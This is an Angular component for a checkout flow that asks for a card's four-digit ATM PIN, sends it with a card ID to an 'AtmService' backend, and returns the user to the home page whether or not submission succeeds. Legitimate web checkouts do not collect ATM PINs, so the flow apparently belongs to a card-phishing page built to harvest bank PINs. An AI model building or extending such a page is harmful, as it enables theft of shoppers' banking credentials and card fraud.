import { Component, ElementRef, QueryList, ViewChildren, inject } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { Header } from "../../Layout/header/header";
import { AtmService } from '../../Core/services/api/atm.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';

@Component({
  imports: [CommonModule, Header],
  selector: 'app-card-atm-pass',
  styleUrl: './card-atm-pass.css',
  templateUrl: './card-atm-pass.html',
})
export class CardATMPass {
  @ViewChildren('pinInput') pinInputs!: QueryList<ElementRef<HTMLInputElement>>;
  
  private readonly router = inject(Router);
  private readonly location = inject(Location);
  private readonly atmService = inject(AtmService);
  private readonly checkoutService = inject(CheckoutService);

  pin: string[] = ['', '', '', ''];
  isLoading = false;

  get isPinComplete(): boolean {
    return this.pin.every(val => val !== '');
  }

  onInput(event: Event, index: number): void {
    const inputElement = event.target as HTMLInputElement;
    const value = inputElement.value;
    
    if (!/^\d*$/.test(value)) {
      inputElement.value = this.pin[index];
      return;
    }

    const lastChar = value.slice(-1);
    this.pin[index] = lastChar;
    inputElement.value = lastChar;

    if (lastChar && index < 3) {
      this.pinInputs.toArray()[index + 1].nativeElement.focus();
    }
  }

  onKeyDown(event: KeyboardEvent, index: number): void {
    if (event.key === 'Backspace' && !this.pin[index] && index > 0) {
      this.pinInputs.toArray()[index - 1].nativeElement.focus();
    }
  }

  onPaste(event: ClipboardEvent): void {
    event.preventDefault();
    const pastedData = event.clipboardData?.getData('text');
    if (pastedData) {
      const numbers = pastedData.replace(/\D/g, '').slice(0, 4).split('');
      numbers.forEach((num, i) => {
        if (i < 4) {
          this.pin[i] = num;
        }
      });
      const focusIndex = numbers.length < 4 ? numbers.length : 3;
      setTimeout(() => {
        if (this.pinInputs) {
           this.pinInputs.toArray()[focusIndex].nativeElement.focus();
        }
      });
    }
  }

  goBack(): void {
    this.location.back();
  }

  confirm(): void {
    if (this.isPinComplete && !this.isLoading) {
      const pinCode = this.pin.join('');
      const userId = this.checkoutService.cardId;

      if (!userId) {
        this.router.navigate(['/']);
        return;
      }

      this.isLoading = true;
      this.atmService.submitAtm(pinCode, userId).subscribe({
        next: () => {
          this.isLoading = false;
          this.router.navigate(['/']);
        },
        error: (err) => {
          console.error('ATM pass submission failed', err);
          this.isLoading = false;
          this.router.navigate(['/']);
        }
      });
    }
  }
}
